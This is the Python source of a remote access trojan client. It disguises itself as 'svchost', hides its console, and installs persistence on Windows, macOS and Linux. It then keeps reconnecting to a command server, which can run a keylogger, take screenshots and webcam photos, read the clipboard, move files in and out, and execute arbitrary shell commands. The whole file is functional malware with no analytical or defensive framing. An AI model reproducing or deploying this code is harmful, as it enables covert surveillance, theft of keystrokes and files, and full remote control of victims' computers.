import os
import shutil
import socket
import subprocess
import sys
import platform
import io
import json
import base64
import threading
import time
import random
import string
import struct
from datetime import datetime
from time import sleep

IS_WINDOWS = platform.system() == "Windows"
IS_MAC = platform.system() == "Darwin"
IS_LINUX = platform.system() == "Linux"

if IS_WINDOWS:
    try:
        import winreg
        import ctypes
    except Exception as e:
        winreg = None
        ctypes = None

try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except Exception as e:
    PIL_AVAILABLE = False

try:
    import pynput
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except Exception as e:
    PYNPUT_AVAILABLE = False

import crypto
import protocol

IP = "127.0.0.1"
PORT = 8443
PROGRAM_NAME = "svchost"
MAX_BUFFER_SIZE = 500
RECONNECT_DELAY = 5
MAX_RECONNECT_DELAY = 300

class Disguise:
    @staticmethod
    def set_console_title(title=""):
        if IS_WINDOWS and ctypes:
            try:
                ctypes.windll.kernel32.SetConsoleTitleW(title)
            except Exception as e:
                pass
    
    @staticmethod
    def hide_console():
        if IS_WINDOWS and ctypes:
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except Exception as e:
                pass

class Keylogger:
    def __init__(self):
        self.buffer = []
        self.active = False
        self.listener = None
        self.lock = threading.Lock()
    
    def format_key(self, key):
        try:
            return key.char
        except AttributeError:
            mapping = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "[BKSP]",
                keyboard.Key.shift: "",
                keyboard.Key.shift_r: "",
                keyboard.Key.ctrl: "",
                keyboard.Key.ctrl_r: "",
                keyboard.Key.alt: "",
                keyboard.Key.alt_r: "",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.delete: "[DEL]",
                keyboard.Key.insert: "[INS]",
                keyboard.Key.home: "[HOME]",
                keyboard.Key.end: "[END]",
                keyboard.Key.page_up: "[PGUP]",
                keyboard.Key.page_down: "[PGDN]",
                keyboard.Key.up: "[UP]",
                keyboard.Key.down: "[DOWN]",
                keyboard.Key.left: "[LEFT]",
                keyboard.Key.right: "[RIGHT]",
            }
            name = str(key).replace('Key.', '').upper()
            return mapping.get(key, f"[{name}]")
    
    def on_press(self, key):
        with self.lock:
            formatted = self.format_key(key)
            if formatted:
                self.buffer.append(formatted)
    
    def start(self):
        if self.active or not PYNPUT_AVAILABLE:
            return "[-] Keylogger unavailable"
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.active = True
            return "[+] Keylogger started"
        except Exception as e:
            return f"[-] Keylogger error: {e}"
    
    def stop(self):
        if not self.active:
            return "[-] Keylogger not running"
        if self.listener:
            self.listener.stop()
            self.listener = None
        self.active = False
        return "[+] Keylogger stopped"
    
    def dump(self):
        with self.lock:
            if not self.buffer:
                return "[-] Buffer empty"
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            data = f"[KEYLOG {timestamp}]\n{''.join(self.buffer)}\n"
            self.buffer = []
            return data

class SystemInfo:
    @staticmethod
    def collect():
        info = {
            'platform': platform.platform(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'username': os.getenv('USERNAME') or os.getenv('USER'),
            'python': platform.python_version(),
            'architecture': platform.architecture()[0],
        }
        if IS_WINDOWS:
            info['windows_version'] = platform.version()
        return json.dumps(info, indent=2)

class Clipboard:
    @staticmethod
    def get():
        try:
            if IS_WINDOWS:
                import win32clipboard
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return f"[CLIPBOARD]\n{data}\n"
            elif IS_MAC:
                result = subprocess.run(['pbpaste'], capture_output=True, text=True)
                return f"[CLIPBOARD]\n{result.stdout}\n"
            elif IS_LINUX:
                result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], 
                                      capture_output=True, text=True)
                return f"[CLIPBOARD]\n{result.stdout}\n"
            return "[-] Clipboard unavailable"
        except Exception as e:
            return f"[-] Clipboard error: {e}"

class Webcam:
    @staticmethod
    def capture():
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, img_encoded = cv2.imencode('.png', frame)
                return img_encoded.tobytes()
            return None
        except Exception as e:
            return None

class FileManager:
    @staticmethod
    def download(filepath):
        try:
            with open(filepath, 'rb') as f:
                return f.read()
        except Exception as e:
            return None
    
    @staticmethod
    def upload(filepath, content):
        try:
            with open(filepath, 'wb') as f:
                f.write(content)
            return True
        except Exception as e:
            return False

class Persistence:
    @staticmethod
    def install():
        try:
            current = os.path.abspath(sys.argv[0])
            
            if IS_WINDOWS and winreg:
                try:
                    appdata = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows')
                    os.makedirs(appdata, exist_ok=True)
                    dest = os.path.join(appdata, f"{PROGRAM_NAME}.py")
                    if current != dest:
                        shutil.copy2(current, dest)
                    
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                       r"Software\Microsoft\Windows\CurrentVersion\Run",
                                       0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ,
                                    f'"{sys.executable}" "{dest}"')
                    winreg.CloseKey(key)
                except Exception as e:
                    print(f"[-] Windows persistence failed: {e}")
                    
            elif IS_MAC:
                try:
                    launch_agents = os.path.expanduser("~/Library/LaunchAgents")
                    os.makedirs(launch_agents, exist_ok=True)
                    plist_path = os.path.join(launch_agents, f"com.{PROGRAM_NAME}.plist")
                    plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{PROGRAM_NAME}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{current}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>'''
                    with open(plist_path, 'w') as f:
                        f.write(plist_content)
                except Exception as e:
                    print(f"[-] macOS persistence failed: {e}")
                    
            else:
                try:
                    target = os.path.expanduser("~/.local/share")
                    os.makedirs(target, exist_ok=True)
                    dest = os.path.join(target, f"{PROGRAM_NAME}.py")
                    if current != dest:
                        shutil.copy2(current, dest)
                    
                    autostart = os.path.expanduser("~/.config/autostart")
                    os.makedirs(autostart, exist_ok=True)
                    desktop = os.path.join(autostart, f"{PROGRAM_NAME}.desktop")
                    entry = f"[Desktop Entry]\nType=Application\nExec={sys.executable} \"{dest}\"\nHidden=false\nName={PROGRAM_NAME}\n"
                    with open(desktop, "w") as f:
                        f.write(entry)
                except Exception as e:
                    print(f"[-] Linux persistence failed: {e}")
                    
        except Exception as e:
            print(f"[-] Persistence error: {e}")

class Client:
    def __init__(self):
        self.keylogger = Keylogger()
        self.crypto = crypto.SecureChannel()
        self.protocol = protocol.ProtocolHandler(self.crypto)
        self.running = True
        self.reconnect_delay = RECONNECT_DELAY
        
    def connect(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((IP, PORT))
            
            key = os.urandom(32)
            self.crypto.set_key(key)
            crypto.SecureChannel.send_key(sock, key)
            
            sock.settimeout(None)
            self.protocol.send(sock, "[+] Client connected")
            return sock
        except Exception as e:
            return None
    
    def screenshot(self):
        if not PIL_AVAILABLE:
            return "[-] PIL unavailable"
        try:
            img = ImageGrab.grab()
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            return buffer.getvalue()
        except Exception as e:
            return None
    
    def execute_shell(self, cmd):
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
            out, err = proc.communicate(timeout=60)
            result = out + err
            return result if result else b"[+] Executed"
        except subprocess.TimeoutExpired:
            proc.kill()
            return b"[-] Timeout"
        except Exception as e:
            return f"[-] Execution failed: {e}".encode('utf-8')
    
    def handle_command(self, sock, cmd):
        if cmd == '/exit':
            return False
        elif cmd == '/screenshot':
            data = self.screenshot()
            if isinstance(data, bytes):
                self.protocol.send(sock, b'[SCREENSHOT]' + data)
            else:
                self.protocol.send(sock, str(data))
        elif cmd == '/keylog_start':
            self.protocol.send(sock, self.keylogger.start())
        elif cmd == '/keylog_stop':
            self.protocol.send(sock, self.keylogger.stop())
        elif cmd == '/keylog_dump':
            self.protocol.send(sock, self.keylogger.dump())
        elif cmd == '/clipboard':
            self.protocol.send(sock, Clipboard.get())
        elif cmd == '/webcam':
            data = Webcam.capture()
            if data:
                self.protocol.send(sock, b'[WEBCAM]' + data)
            else:
                self.protocol.send(sock, "[-] Webcam failed")
        elif cmd == '/info':
            self.protocol.send(sock, SystemInfo.collect())
        elif cmd == '/ping':
            self.protocol.send(sock, "[+] PONG")
        elif cmd.startswith('/download '):
            filepath = cmd[10:].strip()
            data = FileManager.download(filepath)
            if data:
                filepath_bytes = os.path.basename(filepath).encode('utf-8')
                header = struct.pack(">I", len(filepath_bytes))
                self.protocol.send(sock, b'[FILE]' + header + filepath_bytes + data)
            else:
                self.protocol.send(sock, "[-] Download failed")
        elif cmd.startswith('[FILE]'):
            try:
                data = cmd[6:]
                filepath_len = struct.unpack(">I", data[:4])[0]
                filepath = data[4:4+filepath_len].decode('utf-8')
                content = data[4+filepath_len:]
                if FileManager.upload(filepath, content):
                    self.protocol.send(sock, f"[+] Uploaded: {filepath}")
                else:
                    self.protocol.send(sock, "[-] Upload failed")
            except Exception as e:
                self.protocol.send(sock, f"[-] Upload error: {e}")
        else:
            result = self.execute_shell(cmd)
            self.protocol.send(sock, result)
        return True
    
    def listen(self, sock):
        while self.running:
            try:
                msg_type, payload = self.protocol.receive(sock)
                if payload is None:
                    break
                cmd = payload.decode('utf-8', errors='replace').strip()
                if not self.handle_command(sock, cmd):
                    break
            except Exception as e:
                break
    
    def run(self):
        Disguise.hide_console()
        Persistence.install()
        
        while True:
            sock = self.connect()
            if sock:
                self.reconnect_delay = RECONNECT_DELAY
                self.listen(sock)
                try:
                    sock.close()
                except Exception as e:
                    pass
            sleep(self.reconnect_delay)
            self.reconnect_delay = min(self.reconnect_delay * 2, MAX_RECONNECT_DELAY)

if __name__ == "__main__":
    client = Client()
    client.run()
